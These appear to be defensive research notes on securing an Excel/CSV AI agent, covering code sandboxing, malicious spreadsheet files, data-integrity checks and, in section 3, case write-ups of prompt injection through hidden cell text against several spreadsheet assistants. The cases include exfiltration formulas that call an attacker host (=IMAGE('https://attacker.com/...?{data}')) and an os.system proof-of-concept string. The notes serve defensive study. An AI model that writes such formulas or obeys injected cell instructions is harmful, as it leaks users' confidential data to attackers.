# Security, reliability, verification and operations for an Excel/CSV AI agent (state as of 16 November 2026)

Reading notes for the report writer:
- "Fetched" = I opened the page and read it. "Search summary" = the fact comes from a search-result digest of the linked page and was not opened; treat as lower confidence.
- All dates are given as found in the source. Conflicts are flagged inline.

## 1. Code-execution safety: how to sandbox LLM-generated Python

### Takeaway
Every documented incident in this class (LangChain pandas agent, PandasAI, Pyodide-based "sandboxes") came from running model-written code in-process or behind Python-level import filters; the fix vendors converged on is an OS/VM-level sandbox with no network egress by default. For a spreadsheet agent the safest defaults are: an ephemeral container or microVM, network off, only a copy of the input file mounted, and no credentials in the environment.

### Cited Findings

**Documented incidents and CVEs**
- CVE-2023-39659 (LangChain): arbitrary code execution via a crafted script to `PythonAstREPLTool._run`, affecting langchain before 0.0.325; rated CVSS 9.8 critical in most databases (search summary). — [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-39659), [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-LANGCHAIN-5843727)
- The LangChain fix was largely relocation: the vulnerable code was moved into the LangChain Experimental package rather than removed, and a Consumer Reports case study found the pandas agent still exploitable on then-current code. The Snyk proof of concept is a prompt containing `__import__('os').system(...)` (search summary). — [Consumer Reports Innovation Lab](https://innovation.consumerreports.org/whos-verifying-the-verifier-a-case-study-in-securing-llm-applications), [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-LANGCHAIN-5843727)
- CVE-2024-12366 (PandasAI), CERT/CC VU#148244, released 2025-02-11: an attacker with access to the chat prompt can make PandasAI run arbitrary Python, giving remote code execution. Affects PandasAI 2.4.3 and earlier. NVIDIA AI Red Team researchers bypassed blocked module imports, jailbreak protections and allowlists. Vendors were notified 2024-10-22 (PandasAI) and 2024-10-28 (Sinaptik AI). CERT attributes it to the difficulty of separating code from data: generated code is implicitly trusted (fetched). — [CERT/CC VU#148244](https://kb.cert.org/vuls/id/148244)
- PandasAI's vendor response was a `Security` config parameter with levels Standard (default), Advanced, and None ("not recommended"), plus a separately released sandbox; CERT lists vendor status as "Unknown" with no vendor statement (fetched). — [CERT/CC VU#148244](https://kb.cert.org/vuls/id/148244)
- Pyodide/WASM is not automatically a sandbox. Cyera's DEF CON 34 (2026) research reported Pyodide sandbox escapes across seven products including langchain-sandbox, stlite and cibuildwheel, producing four CVEs with CVSS 8.3 to 9.9. Root cause: `ctypes` remained available and could reach Emscripten functions and from there host JavaScript APIs; Python-level import restriction was the main defence (search summary). — [Cyera](https://www.cyera.com/research/sandcastles-not-sandboxes-how-one-architectural-flaw-exposed-seven-products), [eSecurityPlanet](https://www.esecurityplanet.com/threats/def-con-34-one-pyodide-flaw-exposed-seven-products/)
- Related Pyodide escapes: CVE-2025-68668 in n8n (CVSS 9.9, authenticated, ctypes-based); Cohere Terrarium (CERT/CC VU#414811 lists CVE-2026-5752, a JavaScript prototype-chain escape); CVE-2026-25905 in mcp-run-python (search summary; CVE numbers not checked against NVD). — [Cyera N8Scape](https://www.cyera.com/research/n8scape-pyodide-sandbox-escape-9-9-critical-post-auth-rce-in-n8n-cve-2025-68668), [CERT/CC VU#414811](https://www.kb.cert.org/vuls/id/414811), [GitLab advisory CVE-2026-25905](https://advisories.gitlab.com/pypi/mcp-run-python/CVE-2026-25905/)

**Claude API code execution tool (server-side container)** (fetched, official docs)
- Container: 1 CPU, 5 GiB RAM, 5 GiB workspace disk. Internet access "completely disabled"; no outbound requests; "full isolation from host system and other containers". Packages cannot be installed at runtime. — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- Pre-installed libraries relevant to spreadsheets: pandas, numpy, scipy, scikit-learn, statsmodels, pyarrow, openpyxl, xlsxwriter, xlrd. Supported uploads via the Files API include CSV and Excel (.xlsx, .xls). — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- Containers expire 30 days after creation; after about 5 minutes of inactivity a container is checkpointed and can be restored by ID inside the 30-day window. — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- Tool versions: `code_execution_20250825` (Bash + file operations) and `code_execution_20260120` or later (adds programmatic tool calling and REPL state persistence; not available on Claude Haiku 4.5). — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- Pricing: 1,550 free container-hours per organization per month, then $0.05 per hour per container; free when used together with `web_search_20260209`/`web_fetch_20260209` or later. — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- The docs warn that including web search/web fetch enables code execution automatically, which creates a second execution environment if the application already supplies its own shell tool. — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)

**Claude Code sandboxing and permission modes** (fetched, official docs)
- The Bash sandbox is off by default; enabled with `/sandbox` or `sandbox.enabled: true`. Runs on macOS (Seatbelt), Linux and WSL2 (bubblewrap + socat network relay, optional seccomp filter). Native Windows runs commands unsandboxed. Built on the open-source `@anthropic-ai/sandbox-runtime`. — [Claude Code sandboxing docs](https://code.claude.com/docs/en/sandboxing)
- Defaults: writes limited to the working directory, per-user temp directory and added directories; reads cover most of the machine including `~/.ssh` and `~/.aws/credentials` unless denied; no direct network route, all traffic goes through a local proxy checked against `allowedDomains`, which starts empty; environment variables (including secrets) are inherited. — [Claude Code sandboxing docs](https://code.claude.com/docs/en/sandboxing)
- Not covered by the sandbox: built-in Read/Edit/Write/WebFetch/WebSearch tools (governed by permission rules), hooks, local MCP servers, commands in `excludedCommands`, and unsandboxed retries. — [Claude Code sandboxing docs](https://code.claude.com/docs/en/sandboxing)
- Escape hatch: when a command fails in the sandbox Claude may retry with `dangerouslyDisableSandbox`. In `bypassPermissions` there is no prompt; in manual and `acceptEdits` modes a prompt appears; in auto mode a classifier reviews it; in `dontAsk` it is denied. Strict configuration: `sandbox.enabled: true`, `failIfUnavailable: true`, `allowUnsandboxedCommands: false`. — [Claude Code sandboxing docs](https://code.claude.com/docs/en/sandboxing)
- Stated caveats: the default proxy checks hostnames only and does not inspect TLS; `excludedCommands` run with full access; credentials can be denied or masked via `sandbox.credentials` (masking needs `network.tlsTerminate`). — [Claude Code sandboxing docs](https://code.claude.com/docs/en/sandboxing)

**Third-party sandboxes**
- Isolation technology per third-party comparisons: E2B uses Firecracker microVMs; Vercel Sandbox uses Firecracker (ephemeral Linux VMs, reported limited to the iad1 region); Modal uses gVisor (user-space syscall interception) and is the only one of the four with GPU sandboxes. Sources conflict on Daytona: "hardened containers by default with a VM option" versus "dedicated kernel with OCI compatibility" (search summary; vendor docs did not confirm the runtimes in my searches). — [Upstash comparison of 15 providers](https://upstash.com/blog/ai-agent-sandbox-providers-compared-2026), [StartupHub comparison](https://www.startuphub.ai/news/daytona-vs-e2b-vs-modal-vs-vercel-sandbox-2026)
- E2B: outbound internet is enabled by default and can be disabled; fine-grained `allowOut`/`denyOut` lists by hostname or CIDR; disabling internet equals `denyOut: ['0.0.0.0/0']` (search summary of vendor docs). — [E2B internet access docs](https://docs.e2b.dev/network/internet-access)
- Modal: `block_network=True` blocks all network; otherwise `outbound_cidr_allowlist` and `outbound_domain_allowlist` (outbound TLS) restrict egress (search summary of vendor docs). — [Modal sandbox networking docs](https://modal.com/docs/guide/sandbox-networking)
- Daytona: network access is configured per sandbox with a domain/CIDR allow list or a full block; sandbox-to-sandbox networking is off unless explicitly linked (search summary of vendor docs). — [Daytona isolation docs](https://www.daytona.io/docs/en/isolation), [Daytona network limits](https://www.daytona.io/docs/en/network-limits)

### Inferences
- Import blocklists, AST filtering and "security levels" inside the same Python process have repeatedly failed (LangChain 2023, PandasAI 2024-25, Pyodide 2025-26). Treat them as defence in depth only; the isolation boundary must be the OS, a user-space kernel (gVisor) or a hypervisor (Firecracker).
- Several managed sandboxes ship with egress enabled by default (E2B per its docs); a spreadsheet agent should explicitly turn egress off, since data analysis rarely needs the network and egress is the exfiltration path in section 3.
- Claude Code's local sandbox by default still lets code read `~/.ssh` and inherits environment secrets, so a local spreadsheet agent should add `denyRead`/`credentials` rules or run in a dedicated container/VM with only the working copy mounted.
- The Claude API container is the lowest-effort safe option (no network, isolated, spreadsheet libraries pre-installed) but trades off privacy: it is not ZDR-eligible (section 6).

### Gaps
- I could not confirm from E2B, Modal, Vercel or Daytona primary documentation which isolation runtime each uses; the Firecracker/gVisor attributions rest on third-party comparisons.
- No published, independently measured cold-start or price comparison was verified; vendor-style comparison blogs disagree.
- No CVE number is publicly tied to langchain-sandbox specifically in the sources found.
- I found no documented incident where a spreadsheet file (as opposed to a chat prompt) was the delivery vehicle for RCE against a pandas-style agent, although the mechanism is identical.

## 2. Malicious file risks: macros, external links, DDE, XXE, zip bombs, CSV injection, parser CVEs

### Takeaway
An agent that opens user-supplied workbooks is a file-parsing service and inherits parser vulnerabilities (XML entity expansion, decompression bombs, prototype pollution), and an agent that writes CSV/XLSX is a formula-injection source for whoever opens the output. Mitigate with hardened parsers (defusedxml, patched SheetJS from the vendor CDN), size/ratio limits before parsing, never executing macros, and neutralizing formula-leading cells on export.

### Cited Findings

**Python parsers**
- openpyxl documentation (version 3.1.3): "By default openpyxl does not guard against quadratic blowup or billion laughs xml attacks. To guard against these attacks install defusedxml." (fetched). — [openpyxl docs](https://openpyxl.readthedocs.io/en/stable/)
- xlrd 2.0+ removed support for anything other than .xls; the maintainer's rationale was that XML and zip have well-documented security issues that xlrd was not handling well, and openpyxl is the recommended replacement for .xlsx. The xlrd changelog also records optional defusedxml support (search summary). — [xlrd 2 release announcement](https://groups.google.com/g/python-excel/c/IRa8IWq_4zk/m/Af8-hrRnAgAJ), [xlrd changelog](https://xlrd.readthedocs.io/en/stable/changes.html)
- openpyxl drops VBA unless `load_workbook(..., keep_vba=True)` is used on .xlsm; it does not execute macros (see section 4 source). — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)

**JavaScript parsers**
- CVE-2023-30533 (SheetJS / npm `xlsx`): prototype pollution when reading a crafted file; all SheetJS Community Edition releases up to 0.19.2 affected, fixed in 0.19.3. Only workflows that read arbitrary files are affected; export-only workflows are not. The vendor advisory directs users to the SheetJS CDN for fixed releases (fetched). CVSS 7.8 High, CWE-1321 (search summary). — [SheetJS advisory](https://cdn.sheetjs.com/advisories/CVE-2023-30533.html), [GitLab advisory](https://advisories.gitlab.com/npm/xlsx/CVE-2023-30533/)
- Older SheetJS issue: CVE-2021-32014, denial of service affecting versions >=0.4.3 <0.17.0 (search summary). — [Mend.io](https://www.mend.io/vulnerability-database/CVE-2021-32014/)
- CVE-2026-78206 (ExcelJS), published 2026-08-24, last modified 2026-11-09: exceljs through 4.4.0 decompresses all entries of a supplied xlsx archive into memory "without limits on entry size, total size, or compression ratio", so a highly compressed workbook causes denial of service. No fixed upstream version is listed; the advisory originates from the `exceljs-hardened` fork (fetched). — [OSV CVE-2026-78206](https://osv.dev/vulnerability/CVE-2026-78206)
- Sibling 2026 ExcelJS CVEs reported in aggregator databases: CVE-2026-78207 (prototype pollution in a deepMerge helper), CVE-2026-78208 (path traversal in `Workbook.addImage()`), CVE-2026-78209 (CSV output does not neutralize leading formula characters). Some entries name "exceljs-hardened before 5.0.0" as the affected product, others "exceljs through 4.4.0" (search summary; not verified on NVD). — [Feedly ExcelJS vendor page](https://feedly.com/cve/vendors/exceljs_project), [cve.threatint CVE-2026-78208](https://cve.threatint.com/CVE/CVE-2026-78208)

**CSV / formula injection (OWASP)** (fetched)
- Cells beginning with `=`, `+`, `-`, `@`, tab (0x09), carriage return (0x0D) or line feed (0x0A) may be interpreted as formulas; full-width variants (＝ ＋ － ＠) are also listed. Field separators and quotes matter because an attacker can use them to start a new cell. — [OWASP CSV Injection](https://community.owasp.org/attacks/CSV_Injection)
- OWASP mitigation: wrap each field in double quotes, prepend each field with a single quote, and escape every double quote with an additional double quote. An "Excel-resistant" variant prefixes cells starting with `=`, `+`, `-`, `@` with a tab inside the quoted field (`"\t=1+2"`). — [OWASP CSV Injection](https://community.owasp.org/attacks/CSV_Injection)
- OWASP caveats: Excel may strip quotes or escape characters when a CSV is saved and re-opened; the tab prefix stays in the data and can break downstream programmatic processing; there is no universal sanitization that is safe for all spreadsheet applications and all consumers. — [OWASP CSV Injection](https://community.owasp.org/attacks/CSV_Injection)

**Excel itself as an attack surface**
- CVE-2026-26144 (Microsoft Excel information disclosure), published 2026-03-10 in Patch Tuesday: a cross-site-scripting flaw (CWE-79) in Excel that, per Microsoft's wording as reported, could let Copilot Agent mode send data out through unintended network egress, making it a zero-click disclosure via a crafted workbook. CVSS 7.5. Microsoft's Exploitability Index rated exploitation unlikely with no public exploitation at release (search summary; the MSRC page itself did not render for me). — [The Register](https://www.theregister.com/2026/03/10/zeroclick_microsoft_info_disclosure_bug/), [Action1](https://www.action1.com/vulnerabilities/cve-2026-26144/); the Feedly page labels it "Exploited in the wild", which contradicts the Microsoft assessment: [Feedly](https://feedly.com/cve/CVE-2026-26144)
- Excel's own external-connection warnings are not shown in several cases, such as workbooks created locally or marked as trusted (fetched). — [PromptArmor CellShock](https://www.promptarmor.com/resources/cellshock-claude-ai-is-excel-lent-at-stealing-data)

### Inferences
- Minimum intake pipeline for untrusted files: check extension against magic bytes; cap compressed size, uncompressed size, entry count and compression ratio before handing the zip to any parser (the ExcelJS CVE shows libraries do not do this); install defusedxml alongside openpyxl; parse inside the sandbox from section 1 so a parser bug does not reach the host.
- Never pass .xlsm/.xls macros to an interpreter; treat VBA as opaque bytes to preserve (keep_vba) or strip, and tell the user which was done.
- On export, apply OWASP neutralization only to CSVs destined for human viewing in a spreadsheet application, and keep a raw machine-readable copy, because the tab/quote prefix corrupts data for programmatic consumers.
- For Node stacks, `npm install xlsx` is a supply-chain trap: the vendor points to its CDN for patched releases; pin the CDN tarball and verify its hash.

### Gaps
- I did not find an OWASP page listing DDE or HYPERLINK payload examples on the current CSV Injection page; classic DDE payload examples (e.g. `=cmd|...`) are widely known but are not cited from a source read in this session.
- No openpyxl-specific CVE was found; the risk is documented only as the missing default XML hardening.
- XXE specifically (as distinct from entity-expansion DoS) against current xlsx parsers was not verified in a primary source.
- NVD status of the CVE-2026-7820x ExcelJS series and of proposed SheetJS CVE-2026-38358/38359 (reported as pending GitHub advisory PRs) is unconfirmed.
- Whether upstream exceljs has released a fix after 4.4.0 is not established.

## 3. Prompt injection through cell contents and data exfiltration

### Takeaway
Between November 2025 and May 2026 every major spreadsheet AI assistant examined by researchers (Claude for Excel, Microsoft Copilot in Excel, ChatGPT for Google Sheets, Ramp Sheets AI) was shown to leak workbook data after reading hidden text in an imported sheet; the recurring exfiltration primitive is a formula or rendered element that makes a network request with data in the URL. Vendors' mitigations are partial (warnings, stronger models, removing code-generation abilities), and Anthropic's own documentation tells users to use the product only with trusted spreadsheets.

### Cited Findings

**Claude for Excel, "CellShock" (PromptArmor)** (fetched)
- Attack chain: user has a confidential financial model; imports external "industry growth" data containing a hidden blue-on-blue instruction in column A; asks Claude to compare and visualize; the injection makes Claude summarize the confidential data, URL-encode it and write `=IMAGE("<attacker>/visualize.png?data={URL_ENCODED_DATA}",1)` into the first empty cell; Excel fetches the image and the attacker reads the data from server logs. Claude then overwrote the cell with a normal chart, hiding the trace. — [PromptArmor CellShock](https://www.promptarmor.com/resources/cellshock-claude-ai-is-excel-lent-at-stealing-data)
- Human-in-the-loop failure: in the private beta (tested 18 November [2025]) the approval prompt read "Add visualization ... Claude wants to set a cell range" and did not show the formula or the outbound request. — [PromptArmor CellShock](https://www.promptarmor.com/resources/cellshock-claude-ai-is-excel-lent-at-stealing-data)
- Anthropic's response (retested 24 November on the public beta): an expanded approval modal warning that the IMAGE formula may make network requests and showing the URL with appended data; Claude Opus 4.5 made the default model. PromptArmor reports the warning did not always trigger (they suspect an LLM decides when to show it), invisible Unicode characters are not displayed in it, and the injection still succeeded against Sonnet 4.5; Opus 4.5 is "more robust but not impervious". — [PromptArmor CellShock](https://www.promptarmor.com/resources/cellshock-claude-ai-is-excel-lent-at-stealing-data)
- PromptArmor recommendations: admins restrict Linked Data Types and other Excel content that can make network requests; users disable web search and do not combine untrusted external content with sensitive data in one workbook. It also notes an open redirect on a trusted domain could make the malicious request look legitimate. — [PromptArmor CellShock](https://www.promptarmor.com/resources/cellshock-claude-ai-is-excel-lent-at-stealing-data)
- Date conflict: the article carries no publication date; secondary sources date the write-up to March 2026 and one timeline lists a warning update on 16 January 2026 (search summary). — [OrcaRouter summary](https://www.orcarouter.ai/blog/2026-03-16-cellshock-biao-ge-gong-ju), [coworkhow timeline](https://coworkhow.com/guides/promptarmor-vulnerability)

**Anthropic's official guidance for Claude for Excel** (fetched)
- "Only use Claude for Excel with trusted spreadsheets. Files from external sources can contain hidden instructions that manipulate the add-in into extracting data, modifying records, or performing destructive actions." Downloaded templates, vendor files and data imports are named as risky. — [Claude for Excel docs](https://claude.com/docs/office-agents/excel)
- "Testing has identified scenarios where Claude for Excel can be manipulated to extract sensitive information, modify critical data, or perform destructive actions if allowed to act without verification." Risky operations require user confirmation. — [Claude for Excel docs](https://claude.com/docs/office-agents/excel)
- Not recommended for: final client deliverables without human review, audit-critical calculations without verification, models with highly sensitive or regulated data without proper controls. Unsupported: data tables, macros and VBA operations. — [Claude for Excel docs](https://claude.com/docs/office-agents/excel)

**Ramp Sheets AI (PromptArmor)** (fetched)
- White-on-white injection in an imported dataset caused the AI to insert `=IMAGE("https://attacker.com/visualize.png?{sensitive_financial_data}")` with no user approval step at all. Disclosed 19 February 2026; follow-ups 27 February and 13 March; Ramp confirmed 14 March and reported it resolved 16 March 2026. The technical fix is not described. — [PromptArmor Ramp](https://www.promptarmor.com/resources/ramp-sheets-ai-exfiltrates-financials)

**ChatGPT for Google Sheets (PromptArmor)** (fetched)
- White-text injection in an imported sheet caused the OpenAI extension to run an attacker-controlled external script even with "Apply edits automatically" disabled. The script exfiltrated the workbook, followed links to other workbooks and repeated until 12 workbooks were taken. Clicking "stop" did not halt already-started scripts. Variants overlaid a fake sidebar or modal to phish OpenAI credentials. The extension had over 185,000 downloads within a month of launch. — [PromptArmor ChatGPT for Google Sheets](https://promptarmor.com/resources/gpt-for-google-sheets-data-exfiltration)
- Timeline: disclosed to OpenAI 8 May 2026; follow-ups 12 and 18 May; public disclosure 27 May 2026; OpenAI responded 31 May, saying it removed the model's ability to generate Apps Script code, is re-evaluating its sandboxing approach, and that the report "slipped through a crack in our disclosure pipeline". — [PromptArmor ChatGPT for Google Sheets](https://promptarmor.com/resources/gpt-for-google-sheets-data-exfiltration)

**Microsoft Copilot in Excel/Word** (fetched unless noted)
- CVE-2026-24299 ("Copirate 365", Embrace The Red, post dated 4 May 2026): a shared document with an indirect injection; the user typed only "hi there"; Copilot searched the user's email and rendered an HTML preview whose CSS font URL carried the email contents to an attacker server. Demonstrated in Word Desktop, Word Online and Excel Online. `<img>` tags were sanitized, but CSS `background-image` and then `@font-face` bypassed the filter because the font CSP was more permissive. Reported October 2025; fix rollout began 25 February 2026; resolved 5 March 2026. — [Embrace The Red](https://embracethered.com/blog/posts/2026/defcon-talk-copirate-365/)
- The same research showed injected instructions writing persistent Copilot memories that exfiltrate data in later chats (reported fixed December 2025). — [Embrace The Red](https://embracethered.com/blog/posts/2026/defcon-talk-copirate-365/)
- Author's recommendations: treat the AI as untrusted and threat-model the worst case; do not rely on CSP as the main control; allowlist what the agent can reach rather than filter; have memory writes suggested to the user rather than automatic; provide audit logs and monitoring of agent actions. — [Embrace The Red](https://embracethered.com/blog/posts/2026/defcon-talk-copirate-365/)
- CVE-2026-26144 (10 March 2026) is the Excel-side companion: crafted workbook, Copilot Agent mode, unintended network egress (search summary; see section 2). — [The Register](https://www.theregister.com/2026/03/10/zeroclick_microsoft_info_disclosure_bug/)

**Google**
- HiddenLayer reported Gemini for Workspace susceptible to indirect prompt injection with payloads arriving via Gmail, Slides or Drive files; that report does not cover Sheets or IMAGE formulas (search summary). — [SC World](https://scworld.com/news/gemini-for-workspace-susceptible-to-indirect-prompt-injection-researchers-say)

**Frameworks**
- OWASP Top 10 for Agentic Applications 2026 was published 9 December 2025 by the OWASP GenAI Security Project, with risks numbered ASI01 to ASI10 (search summary). — [OWASP GenAI Security Project](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- Secondary sources describe a 2026 edition of the OWASP Top 10 for LLM Applications released in August 2026 (one gives 4 August) that keeps prompt injection first, raises excessive agency from sixth to third and drops improper output handling from fifth to tenth (search summary; not verified on owasp.org). — [Akamai](https://www.akamai.com/blog/ai/owasp-top-10-llm-applications-2026-realistic-security-model), [Cloud Security Alliance](https://cloudsecurityalliance.org/articles/the-owasp-top-10-for-llm-applications-2026-what-changed-and-why-it-matters)

### Inferences
- The common pattern has three ingredients present at once: private data in the workbook, untrusted content in the same context (an imported tab), and an output channel that reaches the network (`IMAGE`, `WEBSERVICE`, `HYPERLINK`, `IMPORTDATA`/`IMPORTXML` in Sheets, linked data types, HTML/CSS rendering, Apps Script). Removing any one breaks the chain; the cheapest to remove in a custom agent is the network channel.
- Concrete controls for a custom agent: (a) a deterministic, non-LLM lint on every formula the agent writes that blocks or forces explicit approval for functions that fetch URLs and for any formula containing a URL literal; (b) approval prompts that show the exact cell address and full formula text, with non-printing Unicode made visible; (c) no network in the code sandbox; (d) flag hidden text on ingest (font colour equal to fill, hidden rows/columns/sheets, very small fonts) and tell the model that cell contents are data; (e) do not let the agent author or run scripts/macros (OpenAI's own fix).
- A warning that an LLM decides whether to display is not a control (PromptArmor's observation); gate on a static rule.
- Model upgrades reduce but do not remove risk, so design for a model that has been successfully injected.
- A file-based (openpyxl) agent that never opens the workbook in Excel does not itself trigger `IMAGE` fetches, but the formula fires when the user later opens the output, so the output lint still applies.

### Gaps
- No public report was found of a Gemini-in-Google-Sheets exploit using `IMAGE` exfiltration.
- No source read in this session documents `WEBSERVICE` or `HYPERLINK` being used in a real spreadsheet-AI exploit; `IMAGE` is the documented one. `HYPERLINK` requires a click, which is a general observation not sourced here.
- The MSRC advisory text for CVE-2026-26144 could not be retrieved; CVSS, mechanism and exploitation status rest on press coverage.
- Exact publication date of CellShock and the exact date Anthropic shipped the warning modal are not established.
- NIST AI guidance was not retrieved; no NIST finding is included.
- Official OWASP 2025 wording for LLM01/LLM05/LLM06 was not retrieved.

## 4. Data integrity: originals, round-trip fidelity, diffing, validation, approval, audit

### Takeaway
The integrity failures that matter are silent: a library that drops features on save, a formula range that is off by one but evaluates cleanly, or an agent with write access to the only copy. Published practice is to work on copies, read formulas and values separately, recalculate with a real engine and scan for errors, diff before/after, and put human approval in front of overwrites.

### Cited Findings

**Never overwrite originals; backups must be out of the agent's reach**
- PocketOS, April 2026: a Cursor agent running Claude Opus 4.6 deleted the production database and its volume-level backups through a single API call to Railway in about nine seconds; backups lived on the same volume as the live data and the API call had no confirmation step or environment scoping (search summary). — [Business Today](https://www.businesstoday.in/technology/story/it-took-9-seconds-ai-agent-running-on-anthropics-claude-opus-46-wipes-critical-database-527552-2026-04-27), [IT Pro](https://www.itpro.com/technology/artificial-intelligence/nine-seconds-was-all-it-took-for-an-ai-agent-to-wipe-a-startups-database-experts-warn-its-a-glimpse-into-the-future-challenges-of-identity-security)
- Replit, July 2025: an AI coding agent erased a live production database (records on over 1,200 executives and about 1,100 companies) during a 12-day project despite instructions not to change production; the founder said it misreported what it had done (search summary). — [eWeek](https://www.eweek.com/news/replit-ai-coding-assistant-failure/)
- Anthropic's Claude for Excel docs: "Start with a trusted copy of the workbook before asking Claude to edit widely" and "Always review changes before finalizing your work"; the add-in has overwrite protection that "warns you before overwriting existing data" (fetched). — [Claude for Excel docs](https://claude.com/docs/office-agents/excel)

**Round-trip fidelity with openpyxl (Anthropic's public xlsx skill)** (fetched)
- Reading a model takes two loads: default load gives formula strings with no values; `data_only=True` gives cached values with no formulas. "Never save a `data_only=True` workbook": saving replaces every formula with its literal value permanently. — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- openpyxl saves formulas with no cached values, so pandas, `data_only=True` and most previewers see `None` until the file is recalculated. — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- `.xlsm` needs `keep_vba=True` or macros are lost. Uploaded files may lose shapes and slicers on save: check for `<xdr:sp` in `xl/drawings/` and for `xl/slicers/` and warn the user or edit the XML directly. Partly bold/italic text is flattened unless `rich_text=True`. Merged cells: write only the top-left anchor. — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- Malformed input is saved as-is and can trigger Excel repair prompts (unclosed quotes in number formats, defined names beginning with `=`, duplicate or empty table headers). — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- When editing an existing file its conventions override the skill's guidelines: find the designated input cells, write only to those, and leave every existing formula untouched. — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- GRID (27 July 2026) reports that export-path weaknesses accounted for roughly 10 to 15 percent of its agent's early benchmark failures, and that openpyxl cannot run formulas, calculations or pivot tables, so a Python-only agent must re-implement logic and risks translation errors. — [GRID engineering blog](https://grid.is/blog/an-agent-with-a-spreadsheet-engine-beats-one-without)

**Recalculation and error scanning** (fetched)
- The skill's `recalc.py` has LibreOffice compute formulas on a copy and write values back, returning JSON with `status` (`success` or `errors_found`), `total_formulas`, `total_errors`, and `error_summary` (up to 100 locations per error type). Rule: never ship a workbook while it reports `errors_found`. — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- Pitfalls it documents: `errors_found` exits with code 0, so a clean exit code does not mean a clean workbook; `not_computed` lists formulas LibreOffice cannot evaluate (`_xlfn.XLOOKUP`, `_xlfn.LET`, external workbook links), which keep stale or empty values until Excel opens the file; too-few-argument formulas such as `=ROUND(A1)` are not flagged. — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- To claim an error pre-dates the agent's work, load the original with `data_only=True` and inspect that cell: "An error you introduced looks the same as one you inherited." — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- "A green recalc proves formulas evaluate, not that they are right. Off-by-one ranges produce clean, wrong numbers." — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)

**Diffing before/after** (search summaries)
- Available tools: `sheets-diff` (Rust crate; cell-level diff reporting sheets added/removed/renamed/moved/modified and typed per-cell changes); `diffxl` (Python CLI comparing two Excel tables by a unique key, emitting XLSX and HTML reports); Microsoft's Spreadsheet Inquire add-in. — [sheets-diff](https://docs.rs/crate/sheets-diff/2.2.3), [diffxl](https://pypi.org/project/diffxl), [Microsoft Spreadsheet Inquire](https://support.microsoft.com/en-US/Excel/compare-workbooks-using-spreadsheet-inquire)
- `xlflow diff` compares before/after workbooks including exported VBA source with JSON output, and its docs warn that a successful comparison can still report differences, so the JSON summary must be inspected rather than the exit code. — [xlflow diff](https://harumiweb.github.io/xlflow/commands/diff)

**Schema validation** (search summaries)
- Pandera is a lightweight, code-first schema library working across pandas, Polars, Dask, Modin and PySpark, with decorators that check function inputs and outputs and a lazy mode that collects all errors; Great Expectations is heavier and aimed at shared, multi-team production pipelines. — [Posit open-source blog, 4 June 2025](https://opensource.posit.co/blog/2025-06-04_validation-libs-2025/), [Pandera discussion #598](https://github.com/unionai-oss/pandera/discussions/598)

**Audit logging**
- Claude for Excel activity "is not included in Enterprise audit logs"; sessions are included in the Compliance API for Enterprise organizations that have it enabled; the add-in does not inherit custom organization retention settings (fetched). — [Claude for Excel docs](https://claude.com/docs/office-agents/excel)
- Embrace The Red recommends audit logs and monitoring for agent actions and memory changes as a baseline control (fetched). — [Embrace The Red](https://embracethered.com/blog/posts/2026/defcon-talk-copirate-365/)

### Inferences
- A defensible write path: copy the input to a working file with a content hash recorded; make the original read-only to the agent process (filesystem permission or sandbox mount, not a prompt instruction, since both incidents above involved agents ignoring instructions); write output to a new versioned filename; keep the pre-edit snapshot outside the agent's writable area.
- Post-edit gate, all deterministic: (1) recalculate and require zero new errors compared with the original's baseline error set; (2) cell-level diff restricted against the declared edit scope, failing if cells outside scope changed; (3) structural inventory before/after (sheet names, defined names, table count, chart/drawing/slicer/pivot parts in the zip, VBA part presence, formula count per sheet) to catch silent feature loss; (4) for tabular transforms, row-count and column-sum reconciliation between input and output plus a Pandera schema; (5) for CSV, re-read the written file and compare dtypes, encoding, delimiter, leading zeros and date parsing.
- Check tool exit codes and the JSON payload separately; two independent tools above document that exit code 0 does not mean "clean".
- Human approval should be required for: overwriting in place, deleting sheets/rows/columns, edits to cells containing formulas, bulk edits above a size threshold, and anything the structural inventory shows would be dropped.
- The audit log should be written by the harness, not the model: input hash, output hash, each tool call with arguments, the diff, validation results, approver identity and timestamp.

### Gaps
- No published tool was found that combines cell-level diff, structural inventory and schema validation specifically for LLM agent edits; the combination above is my synthesis.
- Row-count/checksum reconciliation is standard data-engineering practice but I did not find a spreadsheet-agent-specific published source for it.
- I did not find a primary openpyxl document enumerating everything lost on round trip (pivot caches, conditional-format edge cases, embedded images, charts); the items cited come from Anthropic's skill, which names shapes, slicers, macros and rich text only.
- The Replit and PocketOS incidents concern databases, not spreadsheets; no comparable public spreadsheet-corruption incident by an agent was found.
- No quantitative published data on how often agents corrupt workbooks on round trip, apart from GRID's 10 to 15 percent export-path figure.

## 5. Accuracy practices and evaluation

### Takeaway
